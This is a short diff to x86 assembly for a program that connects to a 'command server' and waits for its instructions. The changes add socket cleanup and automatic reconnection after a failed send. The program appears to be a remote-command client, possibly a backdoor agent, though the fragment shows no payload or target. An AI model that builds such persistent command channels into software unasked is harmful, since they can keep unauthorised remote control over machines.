@@ -46,6 +46,7 @@ _text$00 segment align(10h) 'code'
         jnz _exit
         
         ; Create a socket
+    _connect:
         invoke socket, af_inet, sock_stream, ipproto_tcp
         cmp eax, socket_error
         je _exit
@@ -69,7 +70,6 @@ _text$00 segment align(10h) 'code'
         je _exit
 
         ; Connect to command server 
-    _connect:
         invoke connect, dw_socket, addr sock_addr, sizeof sock_addr
         cmp eax, socket_error
         je _exit
@@ -92,6 +92,9 @@ _text$00 segment align(10h) 'code'
             invoke RtlZeroMemory, addr socket_buffer, buffer_size
             mov byte ptr [socket_buffer], cmd_ready
             invoke send, dw_socket, addr socket_buffer, sizeof byte, 0
+            .if eax == socket_error
+                jmp _reconnect
+            .endif
 
             ; Check if the server is ready
             mov byte ptr [socket_buffer], 0
@@ -161,6 +164,8 @@ _text$00 segment align(10h) 'code'
 
     _reconnect:
         invoke shutdown, dw_socket, sd_both
+        invoke closesocket, dw_socket
+        invoke Sleep, 1000
         jmp _connect
     main endp
 
